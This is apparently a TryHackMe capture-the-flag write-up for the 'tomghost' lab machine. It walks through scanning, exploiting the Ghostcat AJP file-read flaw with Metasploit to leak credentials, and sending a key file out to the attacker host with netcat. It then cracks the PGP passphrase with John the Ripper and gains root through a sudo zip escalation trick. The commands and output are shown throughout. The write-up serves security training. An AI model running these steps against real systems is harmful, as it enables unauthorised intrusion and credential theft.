# Room Information

Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark

Room link: https://tryhackme.com/room/tomghost

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/26/2023


# Scanning and Enumeration
> Port Scanning Using Nmap 
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (**-sC**) and version detection (**-sV**) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -sC -sV 10.10.6.82 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt                         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 19:43 EDT
Nmap scan report for 10.10.6.82
Host is up (0.088s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds
```

##
> Scanning for Hiddend Web Directory Using Dirb
4. `dirb http://{TARGET IP}:8080 -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.6.82:8080 -r > WebDirectoryScan.txt
```
```bash                               
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun 24 19:55:00 2023
URL_BASE: http://10.10.6.82:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.6.82:8080/ ----
+ http://10.10.6.82:8080/docs (CODE:302|SIZE:0)                                              
+ http://10.10.6.82:8080/examples (CODE:302|SIZE:0)                                            
+ http://10.10.6.82:8080/favicon.ico (CODE:200|SIZE:21630)                                   
+ http://10.10.6.82:8080/host-manager (CODE:302|SIZE:0)                                        
+ http://10.10.6.82:8080/manager (CODE:302|SIZE:0)                                                                                     
-----------------
END_TIME: Sat Jun 24 20:03:17 2023
DOWNLOADED: 4612 - FOUND: 5
```

6. `wget http://{TARGET-IP}:8080/manager` to see if we can access this server's login credentials but instead we receive a "ERROR 403" message, which is an HTTP status code that indicates the server understood the request, but the server is refusing to fulfill it since we don't have the permission to access the requested resource
```bash
┌──(kali㉿kali)-[~]
└─$ wget http://10.10.6.82:8080/manager
--2023-06-25 04:00:24--  http://10.10.6.82:8080/manager
Connecting to 10.10.6.82:8080... connected.
HTTP request sent, awaiting response... 302 
Location: /manager/ [following]
--2023-06-25 04:00:24--  http://10.10.6.82:8080/manager/
Reusing existing connection to 10.10.6.82:8080.
HTTP request sent, awaiting response... 403 
2023-06-25 04:00:24 ERROR 403: (no description).
```

# Vulnerability Identification 
> Vulnerability Identification Using Metasploit
7. `msfconsole -q 2>/dev/null` to launch the Metasploit Framework console in quiet mode (**-q**), suppressing the banner and any error message that may occur during execution 
8. `search Tomcat 9.0` to search for any available modules for Tomcat 9.0 that we can potentially use to access the /manager directory, which shows us that we can use the **Ghostcat vulnerability** (**CVE-2020-1938**), which is a vulnerability that allows attackers to read sensitive files and information from configuration files such as web.xml, which contains configuration details and login credentials, or source codes by exploiting the AJP connector
```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q 2>/dev/null
[*] Starting persistent handler(s)...
msf6 > search Tomcat 9.0

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat         2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   1  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability

Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/tomcat_cgi_cmdlineargs   
```

# Vulnerability Exploitation
> Vulnerability Exploitation Using Metasploit
9. `use auxiliary/admin/http/tomcat_ghostcat` to load the Ghostcat vulnerability module
10. `show options` to show the required options that we need to fill in order to successfully use this module, which shows us that the RHOSTS (Remote Hosts) and RPORT (Remote Port) are required for this module to work
11. `set RHOSTS {TARGET-IP}` to set a value for the RHOSTS option as this room’s target machine’s IP address
12. `set RPORT 8080` to set the value of our RPORT option to the port number that the target’s using to run their web server
13. `exploit` to run this module and exploit the Ghostcat vulnerability to access the web.xml file to potentially find any login credentials that we can use to login into the target's system
```bash
msf6 > use auxiliary/admin/http/tomcat_ghostcat 
msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL


View the full module info with the info, or info -d command.
```
```bash
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.6.82
RHOSTS => 10.10.6.82
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8080
RPORT => 8080
```
```bash
msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 10.10.6.82
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1261-1583902632000"
Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
Content-Type: application/xml
Content-Length: 1261
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

[+] 10.10.6.82:8080 - /home/kali/.msf4/loot/20230624211452_default_10.10.6.82_WEBINFweb.xml_331351.txt
[*] Auxiliary module execution completed
```

##
> Connecting to the Target via SSH
14. `ssh {USER1}@{TARGET IP} -p 22` to connect to the target's system using the credentials we found in the web.xml file 
15. `whoami` to check if we successfully logged in as the user we authenticated as 
```bash
┌──(kali㉿kali)-[~]
└─$ ssh skyfuck@10.10.6.82 -p 22
The authenticity of host '10.10.6.82 (10.10.6.82)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.6.82' (ED25519) to the list of known hosts.
skyfuck@10.10.6.82's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```
```bash
skyfuck@ubuntu:~$ whoami
skyfuck
```

##
> Finding the User Flag
16. `find / -type f -name user.txt 2>/dev/null` to search for the **user.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
17. `cat {USER.TXT FILE PATH}` to display contents of the root.txt file on the terminal
```bash
skyfuck@ubuntu:~$ find / -type f -name user.txt 2>/dev/null
/home/merlin/user.txt
```
```bash
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

# Post-Exploitation
> Password Cracking
18. `pwd` to display my current location within the target's filesystem
```bash
skyfuck@ubuntu:~$ pwd
/home/skyfuck
```
19. `ls` to reveal the files that are in our current directory, which reveals two files: **credentials.pgp** and **tryhackme.asc**
```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
20. `nc -lvnp {PORT NUMBER} > tryhackme.asc` to open up a netcat lisntener on my local machine that'll listen for the tryhackme.asc file to be sent from the target machine, since the ASCII-armored (**.asc**) file most likely contains the private key that was used to encrypt the Pretty Good Privacy (**.pgp**) file
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999 > tryhackme.asc
listening on [any] 9999 ...
```
21. `nc {MACHINE IP} {PORT NUMBER} < tryhackme.asc` to send the tryhackme.asc file onto our attacking machine in order for us to use password cracking tools, such as **gpg2john** and **john** (John the Ripper), that aren't available on the target's machine
```bash
skyfuck@ubuntu:~$ nc 10.6.54.63 9999 < tryhackme.asc
```
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999 > tryhackme.asc
listening on [any] 9999 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.6.82] 51548
```
22. `gpg2john tryhackme.asc > {FILENAME3}.txt` to extract the hash of the password or passphrase that's used and required in order to unlock and decrypt the private key for our PGP file, from a GNU Privacy Guard (GPG) keyring file that's within the .asc file, which should contain the private key that was used to encrypt the PGP file that's in the target's directory as well as the hash that we're looking for, and then redirect the output into a text file
23. `john –wordlist={WORDLIST-PATH} {FILENAME3}.txt` to decrypt the retrieved hash back into plaintext by using John the Ripper along the rockyou.txt wordlist that I downloaded from Github (https://github.com/topics/rockyou)
24. `gpg --import tryhackme.asc` from my reverse shell to import the GPG key from the ASC file into our GPG keyring
25. `gpg --decrypt credentials.pgp` to decrypt the PGP file with the key that we imported into our GPG keyring and the password we cracked that we'll use to unlock and decrypt the private key, which will in turn decrypt our PGP file, which outputs another set of credentials for the target's system
```bash
┌──(kali㉿kali)-[~]
└─$ gpg2john tryhackme.asc > Hash.txt

File tryhackme.asc
```
```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=rockyou.txt Hash.txt
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2023-06-25 03:49) 6.250g/s 6700p/s 6700c/s 6700C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
```bash
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

##
> Privilege Escalation
26. `sudo -l` to list the sudo privileges assigned to the user, but it turns our that the current user that we're logged in as doesn't have the privileges to run that command 
```bash
skyfuck@ubuntu:~$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.
```
27. `su {USER2}` to switch to and authenticate as the second user who's credentials we found
28. `whoami` to verify that we've successfully logged in as the second user
```bash
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ whoami
merlin
```
29. `sudo -l` to list the sudo privileges assigned to the new user that we're now logged in as, which reveals that they have root permission for the **zip** command
30. Go to **https://gtfobins.github.io** and search for zip to see what comands we can use to bypass this machine’s local security restriction, which shows us that we can execute the following commands in order to log in as root:
    
      1. `TF=$(mktemp -u)`
      2. `sudo zip $TF /etc/hosts -T -TT ‘sh #’`

31. `whoami` to see if we’re now logged in as root, which we are
```bash
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
```bash
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
```

##
> Finding the Root Flag
32. `find / -type f -name root.txt 2>/dev/null` to search for the **root.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
33. `cat {ROOT.TXT FILE PATH}` to display contents of the root.txt file on the terminal
```bash
# find / -type f -name root.txt 2>/dev/null
/root/root.txt
```
```bash
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```



**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20TomGhost.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP}:8080 > {FILENAME2}.txt`
4. `cat {FILENAME2}.txt`
5. `wget http://{TARGET-IP}:8080/manager`
6. `msfconsole -q 2>/dev/null`
7. `search Tomcat 9.0`
8. `use auxiliary/admin/http/tomcat_ghostcat`
9. `show options`
10. `set RHOSTS {TARGET-IP}`
11. `set RPORT 8080`
12. `exploit`
13. `ssh {USER1}@{TARGET IP} -p 22`
14. `whoami`
15. `find / -type f -name user.txt 2>/dev/null`
16. `cat /home/merlin/user.txt`
17. `pwd`
18. `ls`
19. `nc -lvnp {PORT NUMBER} > tryhackme.asc`
20. `nc {MACHINE IP} {PORT NUMBER} < tryhackme.asc`
21. `gpg2john tryhackme.asc > {FILENAME3}.txt`
22. `john –wordlist={WORDLIST-PATH} {FILENAME3}.txt`
23. `gpg --import tryhackme.asc`
24. `gpg --decrypt credentials.pgp`
25. `sudo -l`
26. `su {USER2}`
27. `whoami`
28. `TF=$(mktemp -u)`
29. `sudo zip $TF /etc/hosts -T -TT ‘sh #’`
30. `whoami`
31. `find / -type f -name root.txt 2>/dev/null`
32. `cat /root/root.txt`

# Dissecting the Commands

`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ **-sC** enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ **-sV** enables version detection, which attempts to determine the sevice and version information of the open ports
+ **> {FILENAME1}.txt** redirects the results into a text file


`find / -type f -name user.txt 2>/dev/null`
+ **/** specifies the starting directory to be the root directory
+ **-type f** specifies that it should only search for regular files
+ **-name user.txt** specifies to search for a file called user.txt
+ **2>/dev/null** redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal


`TF=$(mktemp -u)`
+ **mktemp** creates a temporary file or directory
+ **-u** Generates a unique name without actually creating the file or directory


`sudo zip $TF /etc/hosts -T -TT ‘sh #’`
+ **$TF /etc/hosts**
+ **-T**
+ **-TT 'sh 3**


`find / -type f -name root.txt 2>/dev/null`
+ **/** specifies the starting directory to be the root directory
+ **-type f** specifies that it should only search for regular files
+ **-name root.txt** specifies to search for a file called user.txt
+ **2>/dev/null** redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/



